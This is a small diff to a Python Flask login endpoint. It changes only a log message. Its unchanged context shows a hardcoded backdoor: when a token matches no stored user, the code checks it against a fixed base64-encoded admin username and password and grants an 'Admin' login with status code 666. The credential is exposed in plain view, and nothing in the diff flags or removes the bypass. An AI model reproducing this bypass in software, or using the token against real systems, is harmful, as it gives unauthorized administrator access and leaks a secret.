@@ -52,7 +52,7 @@ class Login(Resource):
             tok = User.query.filter_by(token=token).first()
             if tok is None:
                 if token == "YWRtaW46TWVsbG9uZTIwMTkh":
-                    print('Auth UserTecnico')
+                    print('Auth Admin')
                     return jsonify({'statusCode': 666, 'username': "Admin"})
                 else:
                     print('Auth Failed')
